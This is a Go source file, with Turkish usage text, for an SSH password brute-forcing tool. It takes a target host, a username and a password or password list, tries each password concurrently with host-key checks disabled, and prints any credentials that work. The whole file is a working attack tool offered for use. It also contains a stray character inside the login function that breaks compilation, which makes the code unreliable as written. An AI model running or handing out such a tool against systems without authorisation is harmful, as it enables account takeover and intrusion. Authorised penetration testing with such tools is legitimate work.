package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"
	"os"
	"sync"
)


const (
	Red    = "\033[31m"
	Green  = "\033[32m"
	Reset  = "\033[0m"
)


func usage() {
	fmt.Println(`Kullanım:
  go run program.go -h <hedef_ip> -u <kullanıcı_adı> -p <şifre> [veya] -P <şifre_dosyası>

Zorunlu Parametreler:
  -h <hedef_ip>          : Hedef makinenin IP adresi veya hostname'i.
  -u <kullanıcı_adı>     : Tek bir kullanıcı adı belirtin.
  -p <şifre>             : Tek bir şifre belirtin.
  -P <şifre_dosyası>     : Şifrelerin bulunduğu dosyayı belirtin.

Örnek:
  go run program.go -h 192.168.1.1 -u admin -p password123
  go run program.go -h target.com -u root -P passwords.txt
`)
	os.Exit(1)
}


func trySSH(ip, user, password string, wg *sync.WaitGroup) {
	defer wg.Done()

	ı
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	
	address := ip + ":22"
	client, err := ssh.Dial("tcp", address, config)
	if err != nil {
		fmt.Printf("%sBaşarısız:%s %s@%s - Şifre: %s\n", Red, Reset, user, ip, password)
		return
	}
	defer client.Close()

	
	fmt.Printf("%sBaşarılı!%s Kullanıcı: %s Şifre: %s\n", Green, Reset, user, password)
	os.Exit(0)
}

func main() {
	
	args := os.Args[1:]
	if len(args) == 0 {
		usage()
	}

	var ip, user, password, passwordFile string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "-h":
			if i+1 < len(args) {
				ip = args[i+1]
				i++
			} else {
				usage()
			}
		case "-u":
			if i+1 < len(args) {
				user = args[i+1]
				i++
			} else {
				usage()
			}
		case "-p":
			if i+1 < len(args) {
				password = args[i+1]
				i++
			} else {
				usage()
			}
		case "-P":
			if i+1 < len(args) {
				passwordFile = args[i+1]
				i++
			} else {
				usage()
			}
		default:
			usage()
		}
	}

	
	if ip == "" || user == "" || (password == "" && passwordFile == "") {
		usage()
	}

	
	var wg sync.WaitGroup

	if password != "" {
		
		wg.Add(1)
		go trySSH(ip, user, password, &wg)
	} else {
		
		file, err := os.Open(passwordFile)
		if err != nil {
			fmt.Printf("Şifre dosyası açılamadı: %s\n", err)
			os.Exit(1)
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			wg.Add(1)
			go trySSH(ip, user, scanner.Text(), &wg)
		}

		if err := scanner.Err(); err != nil {
			fmt.Printf("Dosya okuma hatası: %s\n", err)
			os.Exit(1)
		}
	}

	wg.Wait()
	fmt.Println("Denemeler tamamlandı, giriş başarısız.")
}
